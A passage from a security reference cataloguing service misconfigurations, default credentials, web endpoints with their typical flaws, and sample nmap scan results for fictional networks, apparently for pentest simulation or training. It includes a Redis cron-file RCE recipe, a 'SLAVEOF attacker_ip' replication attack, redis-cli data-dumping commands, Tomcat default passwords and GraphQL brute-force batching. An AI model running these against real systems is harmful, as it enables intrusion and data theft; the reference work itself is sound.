| Property | Value |
|----------|-------|
| Default Port | 80/tcp (HTTP), 443/tcp (HTTPS) |
| Config Path | `C:\inetpub\wwwroot\web.config`, `%windir%\system32\inetsrv\config\` |
| Version Banners | `Microsoft-IIS/10.0`, `Microsoft-IIS/8.5` |
| Management Port | 8172/tcp (Web Deploy) |

**Misconfigurations:**
```xml
<!-- Directory browsing -->
<directoryBrowse enabled="true" />

<!-- Detailed errors to remote clients -->
<customErrors mode="Off" />
<httpErrors errorMode="Detailed" />

<!-- Debug compilation -->
<compilation debug="true" />

<!-- WebDAV enabled (write access) -->
<modules>
    <add name="WebDAVModule" />
</modules>

<!-- Short filename (8.3) enabled -->
<!-- Allows enumeration via ~1 requests -->

<!-- Trace enabled -->
<trace enabled="true" localOnly="false" />
```

---

### 3.2 Databases

#### MySQL / MariaDB
| Property | Value |
|----------|-------|
| Default Port | 3306/tcp |
| Config Path | `/etc/mysql/my.cnf`, `/etc/my.cnf` |
| Version Banners | `5.7.42-0ubuntu0.18.04.1`, `8.0.34-0ubuntu0.22.04.1`, `10.11.4-MariaDB` |
| Data Directory | `/var/lib/mysql/` |

**Misconfigurations:**
```ini
# Remote root access
bind-address = 0.0.0.0              # Listens on all interfaces
# GRANT ALL ON *.* TO 'root'@'%';  # Root from any host

# Weak authentication
# Empty root password
# skip-grant-tables                  # No authentication at all

# File access
local-infile = 1                     # Allows LOAD DATA LOCAL INFILE
secure-file-priv = ""               # No restriction on file operations

# Logging
general_log = 1                      # Logs all queries (performance + privacy)
# Log file world-readable

# No SSL required
# require_secure_transport = OFF
```

#### PostgreSQL
| Property | Value |
|----------|-------|
| Default Port | 5432/tcp |
| Config Path | `/etc/postgresql/15/main/postgresql.conf`, `pg_hba.conf` |
| Version Banners | `PostgreSQL 15.4 (Ubuntu 15.4-2.pgdg22.04+1)` |
| Data Directory | `/var/lib/postgresql/15/main/` |

**Misconfigurations:**
```
# pg_hba.conf - overly permissive
host    all    all    0.0.0.0/0    trust      # No password required from anywhere
host    all    all    0.0.0.0/0    md5        # Password auth but from any IP

# postgresql.conf
listen_addresses = '*'                          # Listen on all interfaces
log_statement = 'none'                          # No query logging

# Dangerous extensions enabled
# CREATE EXTENSION dblink;                     # Can make outbound connections
# CREATE EXTENSION pg_read_server_files;       # Can read server files

# Default postgres superuser with weak password
# COPY command for file read/write as postgres user
```

#### MongoDB
| Property | Value |
|----------|-------|
| Default Port | 27017/tcp |
| Config Path | `/etc/mongod.conf` |
| Version Banners | `MongoDB 6.0.x`, `MongoDB 7.0.x` |
| Data Directory | `/var/lib/mongodb/` |

**Misconfigurations:**
```yaml
# mongod.conf
net:
  bindIp: 0.0.0.0                   # Listens on all interfaces
  
security:
  authorization: disabled            # No authentication (default pre-6.0)

# No TLS/SSL configured
# net.tls.mode: disabled

# Default port exposed to internet
# No network-level access control

# ObjectID enumeration (sequential, predictable)
# $where JavaScript injection enabled
```

#### Redis
| Property | Value |
|----------|-------|
| Default Port | 6379/tcp |
| Config Path | `/etc/redis/redis.conf` |
| Version Banners | `Redis 7.0.x`, `Redis 6.2.x` |
| Data Directory | `/var/lib/redis/` |

**Misconfigurations:**
```
# No authentication
# requirepass not set (pre-6.0 default)
# Protected mode disabled
protected-mode no

# Bound to all interfaces
bind 0.0.0.0

# Dangerous commands not disabled
# CONFIG, DEBUG, FLUSHALL, FLUSHDB, KEYS, SAVE available
# rename-command CONFIG ""      # Not set

# RCE via:
# CONFIG SET dir /var/spool/cron/
# CONFIG SET dbfilename root
# SET payload "\n* * * * * /bin/bash -c '...'\n"
# SAVE
# Or via MODULE LOAD (loading malicious .so)

# Slave of (replication attack)
# SLAVEOF attacker_ip 6379
```

---

### 3.3 Application Servers

#### Apache Tomcat
| Property | Value |
|----------|-------|
| Default Ports | 8080/tcp (HTTP), 8443/tcp (HTTPS), 8009/tcp (AJP), 8005/tcp (shutdown) |
| Config Path | `$CATALINA_HOME/conf/` |
| Version Banners | `Apache Tomcat/9.0.80`, `Apache-Coyote/1.1` |
| Manager Path | `/manager/html`, `/manager/text`, `/manager/status` |
| Host Manager | `/host-manager/html` |

**Default Credentials (commonly found):**
```
tomcat:tomcat
admin:admin
manager:manager
tomcat:s3cret
admin:password
role1:tomcat
both:tomcat
```

**Misconfigurations:**
- Manager application deployed and accessible
- Default credentials in `tomcat-users.xml`
- AJP connector exposed (GhostCat CVE-2020-1938)
- Shutdown port accessible (8005)
- Example applications deployed (`/examples/`)
- WAR file upload via Manager for RCE
- Directory listing in default servlet
- `TRACE` method enabled

#### JBoss / WildFly
| Property | Value |
|----------|-------|
| Default Ports | 8080/tcp (HTTP), 9990/tcp (management), 4447/tcp (remoting) |
| Config Path | `$JBOSS_HOME/standalone/configuration/` |
| Version Banners | `JBoss EAP 7.4`, `WildFly 28.0.1.Final` |
| Management Console | `http://host:9990/console` |

**Misconfigurations:**
- Management console with no authentication or default credentials
- JMX Invoker exposed (`/jmx-console/`, `/invoker/`)
- Web console accessible (`/web-console/`)
- JBossWS exposed (`/jbossws/`)
- Deserialization endpoints (JMXInvokerServlet at `/invoker/JMXInvokerServlet`)
- Status page accessible (`/status`)

#### Oracle WebLogic
| Property | Value |
|----------|-------|
| Default Ports | 7001/tcp (HTTP), 7002/tcp (HTTPS), 5556/tcp (Node Manager) |
| Config Path | `$DOMAIN_HOME/config/config.xml` |
| Version Banners | `WebLogic Server 14.1.1.0.0` |
| Admin Console | `http://host:7001/console` |

**Misconfigurations:**
- Admin console with default credentials (weblogic/welcome1)
- T3/IIOP deserialization endpoints
- SSRF via UDDI Explorer (`/uddiexplorer/`)
- XXE in `/wls-wsat/` (CVE-2017-10271)
- Remote code execution via deserialization (multiple CVEs)
- Node Manager accessible without auth

---

### 3.4 CI/CD Services

#### Jenkins
| Property | Value |
|----------|-------|
| Default Port | 8080/tcp |
| Config Path | `$JENKINS_HOME/` (typically `/var/lib/jenkins/`) |
| Version Banners | `Jenkins 2.414.3`, `X-Jenkins: 2.414.3` |
| Management | `/manage`, `/script`, `/configure` |

**Misconfigurations:**
- No authentication required (anyone can access)
- Anonymous read access enabled
- Script console accessible (`/script`) - allows arbitrary Groovy execution = RCE
- API accessible without auth (`/api/json`, `/api/xml`)
- Credentials stored and accessible via `/credentials/`
- Build logs containing secrets
- Jenkins CLI enabled (port 50000)
- Outdated plugins with known vulnerabilities
- GitHub/GitLab webhooks without secret validation

**Key URLs for Enumeration:**
```
/                               # Dashboard
/api/json                       # API - lists all jobs
/script                         # Groovy script console (RCE)
/manage                         # Management page
/credentials/                   # Stored credentials
/configureSecurity/             # Security configuration
/computer/                      # Connected agents/nodes
/asynchPeople/                  # User listing
/systemInfo                     # System information
/job/{name}/                    # Job details
/job/{name}/build               # Trigger build
/job/{name}/config.xml          # Job configuration (may contain secrets)
/securityRealm/user/admin/      # Admin user profile
```

#### GitLab
| Property | Value |
|----------|-------|
| Default Ports | 80/tcp (HTTP), 443/tcp (HTTPS), 22/tcp or 2222/tcp (SSH) |
| Config Path | `/etc/gitlab/gitlab.rb` |
| Version Banners | `GitLab CE 16.x`, `GitLab EE 16.x` |
| Admin Path | `/admin` |

**Misconfigurations:**
- Public registration enabled by default
- Public repositories/snippets exposing code
- API accessible without authentication (`/api/v4/projects`)
- CI/CD variables with secrets in project settings
- Runner registration tokens exposed
- SSRF via webhook/import functionality
- Exposed `.gitlab-ci.yml` with hardcoded secrets
- GitLab Pages serving internal documentation publicly

---

### 3.5 Mail Services

#### SMTP (Postfix / Sendmail / Exchange)
| Property | Value |
|----------|-------|
| Default Ports | 25/tcp (SMTP), 465/tcp (SMTPS), 587/tcp (Submission) |
| Postfix Config | `/etc/postfix/main.cf` |
| Version Banners | `Postfix`, `Microsoft ESMTP MAIL Service`, `Sendmail 8.17` |

**Misconfigurations:**
```
# Open relay - accepts mail for any destination
smtpd_recipient_restrictions = permit    # No restrictions

# Missing DNS-based protections
# No SPF record:    v=spf1 ... -all
# No DKIM signing
# No DMARC record:  v=DMARC1; p=reject; ...

# VRFY/EXPN enabled (user enumeration)
disable_vrfy_command = no

# No TLS enforcement
smtpd_tls_security_level = none

# Weak authentication
# PLAIN/LOGIN auth without TLS
```

#### IMAP/POP3 (Dovecot / Exchange)
| Property | Value |
|----------|-------|
| Default Ports | 143/tcp (IMAP), 993/tcp (IMAPS), 110/tcp (POP3), 995/tcp (POP3S) |
| Config Path | `/etc/dovecot/dovecot.conf` |
| Version Banners | `Dovecot ready.`, `Dovecot (Ubuntu) ready.` |

**Misconfigurations:**
- Plaintext IMAP/POP3 without STARTTLS enforcement
- Weak password policies for mail accounts
- Autoconfiguration endpoints leaking server info
- OWA (Outlook Web App) brute-force friendly
- Exchange autodiscover leaking credentials (CVE-2021-33766)

---

### 3.6 File Services

#### FTP (vsftpd / ProFTPD / Pure-FTPd)
| Property | Value |
|----------|-------|
| Default Port | 21/tcp (control), 20/tcp (data active), high ports (passive) |
| Config Path | `/etc/vsftpd.conf`, `/etc/proftpd/proftpd.conf` |
| Version Banners | `vsFTPd 3.0.5`, `ProFTPD 1.3.8`, `Pure-FTPd` |

**Misconfigurations:**
```
# Anonymous access
anonymous_enable=YES
anon_upload_enable=YES              # Anonymous upload
anon_mkdir_write_enable=YES         # Anonymous directory creation
write_enable=YES                    # Write access

# No encryption
ssl_enable=NO                       # No FTPS
force_local_logins_ssl=NO

# Directory traversal
# chroot_local_user=NO              # Users can traverse filesystem

# Writable directories accessible via web server (webshell upload)
```

#### SMB (Samba / Windows)
| Property | Value |
|----------|-------|
| Default Ports | 445/tcp (SMB), 139/tcp (NetBIOS), 137/udp (NetBIOS Name) |
| Config Path | `/etc/samba/smb.conf` |
| Version Banners | `Samba 4.17.x`, `Windows Server 2022 Build xxxxx` |

**Misconfigurations:**
```ini
# Guest/null session access
[share]
    guest ok = yes
    browseable = yes
    read only = no
    
# SMB signing not required
server signing = auto               # Should be 'mandatory'

# SMBv1 enabled (EternalBlue, WannaCry)
server min protocol = NT1            # Should be SMB2_10 or higher

# Null sessions allowed
map to guest = bad user
restrict anonymous = 0               # Windows: allows anonymous enumeration

# World-readable shares with sensitive data
# IPC$ share allowing null session enumeration
```

#### NFS
| Property | Value |
|----------|-------|
| Default Ports | 2049/tcp (NFS), 111/tcp (portmapper/rpcbind) |
| Config Path | `/etc/exports` |

**Misconfigurations:**
```
# Overly permissive exports
/home           *(rw,no_root_squash)     # Everyone, with root access
/var/www        *(rw,sync)               # Web root writable by anyone
/backup         *(ro)                    # Backup data readable by anyone

# no_root_squash = remote root has root access on NFS
# no_all_squash with broad IP ranges
# Missing IP restrictions (using * wildcard)
```

---

### 3.7 Cache and Queue Services

#### Redis (see also 3.2)
**Unauthenticated Access Patterns:**
```
# Test for no-auth access:
redis-cli -h target_ip ping          # Returns PONG if accessible
redis-cli -h target_ip info          # Returns full server info
redis-cli -h target_ip config get *  # Returns all configuration

# Data exfiltration:
redis-cli -h target_ip keys *       # List all keys
redis-cli -h target_ip get session:* # Dump session data
```

#### RabbitMQ
| Property | Value |
|----------|-------|
| Default Ports | 5672/tcp (AMQP), 15672/tcp (Management UI), 25672/tcp (Clustering), 61613/tcp (STOMP) |
| Config Path | `/etc/rabbitmq/rabbitmq.conf` |
| Version Banners | `RabbitMQ 3.12.x` |
| Management UI | `http://host:15672/` |

**Default Credentials:** `guest:guest` (only allowed from localhost by default, but often misconfigured)

**Misconfigurations:**
- `guest` user allowed from remote hosts (`loopback_users = none`)
- Management UI exposed without network restriction
- No TLS on AMQP connections
- Default virtual host `/` with broad permissions
- Erlang cookie readable (allows cluster access)
- STOMP/MQTT plugins enabled without auth

#### Memcached
| Property | Value |
|----------|-------|
| Default Port | 11211/tcp, 11211/udp |
| Version Banner | `VERSION 1.6.x` |

**Misconfigurations:**
- No authentication mechanism (by design, pre-SASL)
- Bound to `0.0.0.0` (all interfaces)
- UDP enabled (DDoS amplification)
- Accessible from untrusted networks
- Stores sensitive session data retrievable via `stats cachedump`

---

## 4. Common Web Endpoints and Parameters

### 4.1 Authentication Endpoints

| Endpoint | Method | Parameters | Notes |
|----------|--------|------------|-------|
| `/login` | GET/POST | `username`, `password`, `remember_me`, `csrf_token`, `redirect`, `next` | Primary login |
| `/api/auth/login` | POST | `{"username": "...", "password": "...", "mfa_code": "..."}` | API login (JSON) |
| `/api/auth/token` | POST | `{"grant_type": "password", "client_id": "...", "username": "...", "password": "..."}` | OAuth2 token |
| `/api/auth/refresh` | POST | `{"refresh_token": "..."}` | Token refresh |
| `/register` | GET/POST | `username`, `email`, `password`, `password_confirm`, `first_name`, `last_name`, `phone` | Registration |
| `/api/auth/register` | POST | `{"username": "...", "email": "...", "password": "...", "role": "user"}` | API registration (mass assignment risk on `role`) |
| `/forgot-password` | GET/POST | `email` | Password reset request |
| `/reset-password` | GET/POST | `token`, `password`, `password_confirm` | Password reset completion |
| `/api/auth/verify-email` | GET/POST | `token`, `email` | Email verification |
| `/api/auth/mfa/setup` | POST | `{"type": "totp"}` | MFA setup |
| `/api/auth/mfa/verify` | POST | `{"code": "123456"}` | MFA verification |
| `/logout` | GET/POST | `csrf_token` | Logout |
| `/oauth/authorize` | GET | `client_id`, `redirect_uri`, `response_type`, `scope`, `state` | OAuth2 authorization |
| `/oauth/callback` | GET | `code`, `state` | OAuth2 callback |
| `/.well-known/openid-configuration` | GET | None | OIDC discovery |

**Common Vulnerabilities:**
- Username enumeration (different responses for valid/invalid users)
- No rate limiting / account lockout (brute force)
- Password reset token predictability
- JWT `alg: none` bypass, weak secret
- OAuth redirect_uri validation bypass (open redirect)
- Session fixation (session ID not regenerated after login)
- Missing MFA bypass via API endpoints
- CSRF on login form (login CSRF)

---

### 4.2 CRUD Endpoints

| Endpoint | Method | Parameters | Notes |
|----------|--------|------------|-------|
| `/api/v1/users` | GET | `page`, `limit`, `offset`, `sort`, `order`, `search`, `role`, `status` | List users |
| `/api/v1/users` | POST | `{"name": "...", "email": "...", "role": "..."}` | Create user |
| `/api/v1/users/{id}` | GET | `fields`, `expand`, `include` | Get user by ID |
| `/api/v1/users/{id}` | PUT/PATCH | `{"name": "...", "email": "...", "role": "..."}` | Update user |
| `/api/v1/users/{id}` | DELETE | None | Delete user |
| `/api/v1/orders` | GET | `page`, `limit`, `status`, `date_from`, `date_to`, `customer_id` | List orders |
| `/api/v1/orders/{id}` | GET | `include=items,customer` | Get order details |
| `/api/v1/orders` | POST | `{"customer_id": "...", "items": [...], "discount_code": "..."}` | Create order |
| `/api/v1/products` | GET | `category`, `min_price`, `max_price`, `in_stock`, `brand` | List products |
| `/api/v1/products/{id}` | GET | None | Get product |
| `/api/v1/products/{id}/reviews` | GET/POST | `rating`, `comment`, `page` | Product reviews |
| `/api/v1/comments` | GET/POST | `post_id`, `parent_id`, `content`, `page` | Comments (XSS target) |
| `/api/v1/settings` | GET/PUT | `{"notifications": true, "theme": "dark"}` | User settings |
| `/api/v1/profile` | GET/PUT | `{"name": "...", "avatar": "...", "bio": "..."}` | User profile |

**Common Vulnerabilities:**
- IDOR (Insecure Direct Object Reference) - changing `{id}` to access other users' data
- Mass assignment - sending `role: admin` in registration/update
- Broken pagination - negative page numbers, excessive limits
- SQL injection in sort/order parameters
- Missing authorization checks (horizontal/vertical privilege escalation)
- Excessive data exposure (returning password hashes, internal IDs)

---

### 4.3 Search Endpoints

| Endpoint | Method | Parameters | Notes |
|----------|--------|------------|-------|
| `/search` | GET | `q`, `query`, `search`, `keyword`, `term` | General search |
| `/api/v1/search` | GET/POST | `{"query": "...", "filters": {...}, "page": 1, "size": 20}` | API search |
| `/api/v1/search/suggest` | GET | `q`, `prefix`, `limit` | Autocomplete |
| `/api/v1/search/advanced` | POST | `{"field": "title", "operator": "contains", "value": "..."}` | Advanced search |
| `/api/v1/elasticsearch/_search` | POST | `{"query": {"match": {"field": "value"}}}` | Direct ES proxy (dangerous) |
| `/autocomplete` | GET | `term`, `type` | Autocomplete |
| `/api/v1/filter` | GET | `category`, `tags`, `date_range`, `author`, `status` | Filtered listing |

**Common Vulnerabilities:**
- Reflected XSS in search results (query displayed back unescaped)
- SQL injection in search parameters
- Elasticsearch query injection (if queries pass through to ES)
- LDAP injection (if search queries LDAP backend)
- Server-side template injection (SSTI) if search term rendered in template
- Information disclosure via error messages in search
- Denial of service via expensive regex/wildcard searches

---

### 4.4 File Operation Endpoints

| Endpoint | Method | Parameters | Notes |
|----------|--------|------------|-------|
| `/upload` | POST | `file` (multipart), `type`, `category` | File upload |
| `/api/v1/files/upload` | POST | `file` (multipart), `folder`, `public` | API file upload |
| `/api/v1/files` | GET | `page`, `type`, `sort` | List files |
| `/api/v1/files/{id}` | GET | None | File metadata |
| `/api/v1/files/{id}/download` | GET | None | Download file |
| `/download` | GET | `file`, `path`, `name`, `id` | Generic download |
| `/api/v1/files/{id}` | DELETE | None | Delete file |
| `/api/v1/export` | GET/POST | `format`, `fields`, `filter`, `type` | Data export |
| `/api/v1/import` | POST | `file` (multipart), `format`, `mapping` | Data import |
| `/api/v1/avatar` | POST | `image` (multipart) | Avatar upload |
| `/media/{path}` | GET | None | Media file serving |
| `/static/{path}` | GET | None | Static file serving |
| `/api/v1/documents/{id}/preview` | GET | `page`, `format` | Document preview |

**Common Vulnerabilities:**
- Unrestricted file upload (upload `.php`, `.jsp`, `.aspx` webshells)
- Path traversal in download (`../../etc/passwd`)
- SSRF via URL-based file import
- XXE via XML/DOCX/SVG file upload
- File overwrite (predictable filenames)
- Missing content-type validation (upload HTML → stored XSS)
- Zip slip (directory traversal in ZIP extraction)
- Large file DoS (no size limits)
- Local File Inclusion via `file` or `path` parameter
- Insecure temporary file storage

---

### 4.5 Admin Endpoints

| Endpoint | Method | Parameters | Notes |
|----------|--------|------------|-------|
| `/admin` | GET | None | Admin dashboard |
| `/admin/login` | GET/POST | `username`, `password` | Admin login (separate from user login) |
| `/admin/users` | GET | `page`, `search`, `role`, `status` | User management |
| `/admin/users/{id}` | GET/PUT/DELETE | Various | User admin |
| `/admin/users/{id}/impersonate` | POST | None | User impersonation |
| `/admin/settings` | GET/PUT | `{"site_name": "...", "maintenance": false}` | Site settings |
| `/admin/config` | GET/PUT | Various | System configuration |
| `/admin/logs` | GET | `level`, `date`, `source` | System logs |
| `/admin/backup` | POST | `type`, `format` | Create backup |
| `/admin/backup/download` | GET | `file` | Download backup |
| `/admin/cache/clear` | POST | None | Clear cache |
| `/admin/database` | GET | None | Database management UI |
| `/admin/queue` | GET | None | Job queue management |
| `/admin/scheduler` | GET/POST | `job`, `cron`, `action` | Scheduled tasks |
| `/api/admin/stats` | GET | `period`, `metric` | Admin statistics |
| `/dashboard` | GET | None | Admin dashboard (alternative) |
| `/console` | GET | None | Debug console (Rails, Django) |
| `/debug` | GET | None | Debug page |
| `/_admin` | GET | None | Alternative admin path |
| `/manage` | GET | None | Management interface |

**Common Vulnerabilities:**
- Admin panel accessible without proper authentication
- Weak or default admin credentials
- Missing authorization (regular user can access admin routes)
- CSRF on admin actions (user deletion, config changes)
- Admin backup download without re-authentication
- Command injection via admin configuration fields
- Unrestricted impersonation functionality
- Log injection / log forging

---

### 4.6 API Endpoints (General Patterns)

| Endpoint Pattern | Notes |
|-----------------|-------|
| `/api/v1/*`, `/api/v2/*` | Versioned REST API |
| `/graphql` | GraphQL endpoint |
| `/api/swagger.json`, `/api/openapi.yaml` | API documentation |
| `/api/health`, `/api/status` | Health check |
| `/api/version` | Version info |
| `/api/config` | Configuration (should be restricted) |
| `/api/debug` | Debug endpoint (should be restricted) |
| `/api/internal/*` | Internal API (should not be external) |
| `/api/webhook/*` | Webhook receivers |
| `/api/batch` | Batch operations |
| `/api/graphql/playground` | GraphQL Playground |
| `/api/graphql/voyager` | GraphQL Voyager (schema visualization) |
| `/.well-known/*` | Well-known URIs |
| `/robots.txt` | Robot exclusion (information disclosure) |
| `/sitemap.xml` | Sitemap (endpoint enumeration) |
| `/crossdomain.xml` | Flash cross-domain policy |
| `/.env` | Environment variables |
| `/.git/config` | Git configuration |
| `/wp-json/wp/v2/users` | WordPress REST API user enum |
| `/api/v1/swagger-resources` | Swagger resources |

**GraphQL-Specific:**
```graphql
# Introspection query (schema enumeration)
{__schema{types{name,fields{name,args{name}}}}}

# Common mutations
mutation { createUser(input: {email: "...", role: ADMIN}) { id } }
mutation { updateUser(id: "1", input: {role: ADMIN}) { id role } }
mutation { deleteUser(id: "1") { success } }

# Batching attacks
[{"query": "mutation { login(u:\"a\",p:\"1\") { token } }"},
 {"query": "mutation { login(u:\"a\",p:\"2\") { token } }"},
 ...repeated for brute force...]

# Nested query DoS
{ users { posts { comments { author { posts { comments { ... } } } } } } }
```

**Common Vulnerabilities:**
- API documentation exposed in production
- GraphQL introspection enabled in production
- Broken Object Level Authorization (BOLA)
- Broken Function Level Authorization
- Missing rate limiting
- Mass assignment via API
- SSRF via webhook URLs
- Information disclosure via verbose errors
- JWT manipulation
- API key leakage in URLs (query parameters logged)

---

## 5. Realistic Port Scan Results

### 5.1 Startup (LAMP Stack)

```
# Nmap 7.94 scan initiated
# Target: 192.168.1.10 (web-01)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: My Startup App
443/tcp  open  ssl/http    Apache httpd 2.4.52 ((Ubuntu))
|_ssl-cert: Subject: commonName=startup.local
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql       MySQL 8.0.34-0ubuntu0.22.04.1
| mysql-info:
|   Protocol: 10
|   Version: 8.0.34-0ubuntu0.22.04.1
8080/tcp open  http-proxy  
|_http-title: phpMyAdmin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Target: 192.168.1.11 (db-01)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 8.0.34-0ubuntu0.22.04.1
```

### 5.2 Startup (MEAN Stack)

```
# Target: 10.0.0.10 (web-app-01)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Angular App
443/tcp   open  ssl/http nginx 1.24.0
3000/tcp  open  http     Node.js Express framework
|_http-title: API Server
9229/tcp  open  nodejs   Node.js debugger
27017/tcp open  mongodb  MongoDB 6.0.12
| mongodb-info:
|   MongoDB Build info
|   version: 6.0.12
|   OpenSSLVersion: OpenSSL 3.0.2 15 Mar 2022
```

### 5.3 SMB E-Commerce

```
# Target: 10.0.1.10 (web-01 - DMZ)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.24.0
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: 301 Moved Permanently
443/tcp open  ssl/http nginx 1.24.0
|_http-title: ShopCo - Online Store
|_ssl-cert: Subject: commonName=www.shopco.local
| http-headers:
|   X-Powered-By: PHP/8.2.12
|   Set-Cookie: PHPSESSID=...; path=/; HttpOnly

# Target: 10.0.1.20 (mail-01 - DMZ)
PORT    STATE SERVICE  VERSION
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: mail.shopco.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: IMAP4rev1 SASL-IR LOGIN-REFERRALS ID listed ENABLE IDLE capabilities STARTTLS have post-login Pre-login more AUTH=PLAINA0001 OK
587/tcp open  smtp     Postfix smtpd
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)

# Target: 10.0.2.10 (app-01 - Internal)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
8080/tcp open  http    Apache Tomcat 9.0.80
|_http-title: Apache Tomcat/9.0.80
|_http-server-header: Apache-Coyote/1.1
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)

# Target: 10.0.3.10 (db-01 - Internal)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
3306/tcp open  mysql      MySQL 8.0.34
| mysql-info:
|   Protocol: 10
|   Version: 8.0.34

# Target: 10.0.3.20 (cache-01 - Internal)
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
6379/tcp  open  redis     Redis key-value store 7.0.12
11211/tcp open  memcached Memcached 1.6.21
```

### 5.4 Enterprise (Full Scan)

```
# ==========================================
# EXTERNAL / DMZ SCAN RESULTS
# ==========================================

# Target: 10.10.1.10 (lb-01 - Load Balancer)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     
|_http-title: 301 Moved Permanently
443/tcp open  ssl/http 
|_http-title: Enterprise Portal
|_ssl-cert: Subject: commonName=portal.enterprise.local
| ssl-enum-ciphers:
|   TLSv1.2:
|     ciphers:
|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (ecdh_x25519)
|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (ecdh_x25519)
|   TLSv1.3:
|     ciphers:
|       TLS_AES_256_GCM_SHA384 (ecdh_x25519)

# Target: 10.10.1.30 (web-01 - Web Server)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.24.0
443/tcp open  ssl/http nginx 1.24.0
|_http-server-header: nginx/1.24.0 (Red Hat Enterprise Linux)

# Target: 10.10.1.40 (mail-01 - Exchange)
PORT    STATE SERVICE  VERSION
25/tcp  open  smtp     Microsoft Exchange smtpd
|_smtp-commands: mail.enterprise.local Hello [10.10.1.40], SIZE 37748736, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XRDST
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-title: Outlook Web App
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-title: Outlook
587/tcp open  smtp     Microsoft Exchange smtpd
993/tcp open  ssl/imap Microsoft Exchange imapd

# ==========================================
# APPLICATION TIER SCAN RESULTS
# ==========================================

# Target: 10.10.2.10 (app-01 - Application Server)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.7 (protocol 2.0)
8080/tcp open  http        JBoss EAP 7.4.0.GA
|_http-title: Welcome to JBoss EAP 7
|_http-server-header: JBoss-EAP/7
8443/tcp open  ssl/http    JBoss EAP 7.4.0.GA
9990/tcp open  http        JBoss EAP Management Console
|_http-title: HAL Management Console

# Target: 10.10.2.20 (api-01 - API Gateway)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
8000/tcp open  http    Kong API Gateway 3.4.x
|_http-title: Site doesn't have a title
8443/tcp open  ssl/http Kong API Gateway admin
8001/tcp open  http    Kong Admin API
|_http-title: Kong Admin

# Target: 10.10.2.30 (mq-01 - Message Queue)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.7 (protocol 2.0)
5672/tcp  open  amqp       RabbitMQ 3.12.6
| amqp-info:
|   capabilities:
|     publisher_confirms: YES
|     consumer_cancel_notify: YES
|   cluster_name: rabbit@mq-01
|   version: 3.12.6
15672/tcp open  http       RabbitMQ Management UI
|_http-title: RabbitMQ Management
25672/tcp open  unknown    

# ==========================================
# DATA TIER SCAN RESULTS
# ==========================================

# Target: 10.10.3.10 (db-01 - Primary Database)
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.7 (protocol 2.0)
1521/tcp open  oracle-tns   Oracle TNS listener 19.0.0.0.0
| oracle-tns-version:
|   Version: 19.0.0.0.0 - Production

# OR (SQL Server variant)
# 1433/tcp open  ms-sql-s   Microsoft SQL Server 2022 16.00.4085
# | ms-sql-info:
# |   Version: Microsoft SQL Server 2022 RTM - 16.0.1000.6

# OR (PostgreSQL variant)
# 5432/tcp open  postgresql  PostgreSQL 15.4

# Target: 10.10.3.12 (db-03 - Elasticsearch)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
9200/tcp open  http          Elasticsearch REST API 8.10.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8)
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
9300/tcp open  vce           Elasticsearch cluster communication

# Target: 10.10.3.20 (cache-01 - Redis Cluster)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
6379/tcp  open  redis   Redis key-value store 7.0.12
16379/tcp open  unknown Redis cluster bus

# ==========================================
# IDENTITY ZONE SCAN RESULTS
# ==========================================

# Target: 10.10.4.10 (dc-01 - Domain Controller)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
|_kerberos-principal: krbtgt/ENTERPRISE.LOCAL@ENTERPRISE.LOCAL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
|_ldap-rootdse: LDAP root DSE
| ldap-search:
|   Context: DC=enterprise,DC=local
